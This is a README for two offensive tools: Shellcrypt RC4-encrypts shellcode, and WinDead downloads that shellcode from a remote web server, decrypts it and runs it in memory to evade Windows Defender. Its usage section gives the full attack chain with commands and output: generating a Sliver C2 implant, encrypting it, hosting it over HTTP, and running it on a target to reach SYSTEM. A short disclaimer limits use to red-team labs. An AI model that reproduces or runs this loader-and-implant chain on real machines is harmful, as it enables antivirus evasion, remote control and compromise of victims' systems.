<div align="center">
  <h1>Windead & Shellcrypt</h1>
</div>

<p align="center">
  <img src="Windead & Shellcrypt.png" alt="logo" width="50%">
</p>

> [!CAUTION]
> **Windead** & **ShellCrypt** are like Tom & Jerry, they are inseparable.


# What are they good for ?

The main objective of these two tools is to be able to execute shellcode on machines protected by Windows Defender. 

- **Shellcrypt** is Jerry, it's the first step used to encrypt the shellcode using rc4 algorithm. You give it a file containing the raw shellcode, it gives you a nice gift, a file containing the encrypted shellcode.
- **WinDead** is Tom, it's the main character but without **Shellcrypt** it can't do anything. **WinDead** takes your encrypted shellcode, hosted on a remote web server, decrypt it and execute it.

# Usage

1 - You need to create a file containing your shellcode in raw format. It can be anything like a msfvenom output or a sliver session. For this example, let's take a sliver session :
```bash
sliver > generate --http 192.168.1.51 -f shellcode --os windows --name session

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 15s
[*] Encoding shellcode with shikata ga nai ... success!
[*] Implant saved to /opt/sliver/session.bin
```
\
2 - Once the file is created, you need to encrypt it using **Shellcrypt** :
```powershell
Shellcrypt.exe session.bin session.enc

[i] Shellcode retrieved with success !
[i] File created with success !
[i] The key (Keep it somewhere) : fb29b4fdb3e278542d0ef5c7d21c1c4153975c83609b6e281a67aee71e38b809
```
- `calc.bin` is the file containing the shellcode
- `calc.enc` is the name of the file you want to create, containing the encrypted shellcode

\
3 - Then, you have to host the file on a http web server, you can use the http.server module from python3 :
```bash
sudo python3 -m http.server 443
Serving HTTP on 0.0.0.0 port 443 (http://0.0.0.0:443/) ...
```

\
4 - Finally, you can now use **WinDead** to execute the shellcode on the target machine :
```powershell
Windead.exe 192.168.1.46 443 session.enc fb29b4fdb3e278542d0ef5c7d21c1c4153975c83609b6e281a67aee71e38b809

[i] Payload successfully retrieved! Size: 17353014 bytes
[i] Buffer allocated with success !
[i] Memory protection changed with success !
[i] Your shellcode has been executed with success ! Now, time to become SYSTEM =)
```
- `192.168.1.46` is the ip of the remote web server
- `443` is the port of the remote web server
- `session.enc` is the file containing the encrypted shellcode
- `fb29b4....` is the key that was printed out by **ShellCrypt**

# Caution

Please, don't be stupid. Use it only for doing red team lab or pro labs. This is the main goal of this tool, being able to bypass AV of these labs.
